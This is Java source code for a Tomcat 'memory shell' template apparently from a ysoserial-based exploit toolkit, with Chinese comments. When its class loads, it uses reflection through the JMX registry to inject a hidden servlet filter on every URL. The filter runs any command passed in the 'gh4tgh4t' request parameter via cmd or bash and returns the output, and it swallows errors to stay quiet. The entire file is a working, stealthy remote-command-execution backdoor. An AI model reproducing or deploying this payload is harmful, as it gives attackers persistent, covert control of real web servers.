package ysoserial.bullet.template.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class TomcatFilter implements Filter{

    private static String _filterName = "gh4tgh4t";
    private static String param = "gh4tgh4t";
    private static String filterUrlPattern = "/*";
    // 适用范围: Tomcat 7 ~ 9
    static {
        try {
            String filterName = _filterName + System.nanoTime();

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot的jmx中为Tomcat而非Catalina
                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);

                field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                if (map.get(filterName) == null) {
                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try {
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    } catch (ClassNotFoundException e) {
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }

                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
                    Filter filter = new TomcatFilter();

                    filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
                    standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);

                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    } catch (ClassNotFoundException e) {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }

                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, filterUrlPattern);
                    //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);

                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                    map.put(filterName, filterConfig);
                }
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            String string = request.getParameter(param);
            if (string != null) {
                Object lastRequest = request;
                Object lastResponse = response;
                // 解决包装类RequestWrapper的问题
                // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
                if (!(lastRequest instanceof RequestFacade)) {
                    Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                    lastRequest = getRequest.invoke(request);
                    while (true) {
                        if (lastRequest instanceof RequestFacade) break;
                        lastRequest = getRequest.invoke(lastRequest);
                    }
                }
                // 解决包装类ResponseWrapper的问题
                if (!(lastResponse instanceof ResponseFacade)) {
                    Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                    lastResponse = getResponse.invoke(response);
                    while (true) {
                        if (lastResponse instanceof ResponseFacade) break;
                        lastResponse = getResponse.invoke(lastResponse);
                    }
                }

//                String string = request.getHeader("cmd");
                if (!string.isEmpty()) {
                    String[] cmds = null;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        cmds = new String[]{"cmd", "/c", string};
                    } else {
                        cmds = new String[]{"/bin/bash", "-c", string};
                    }
                    String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                    ((ResponseFacade) lastResponse).getWriter().println(result);
                }
                return;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {}
}
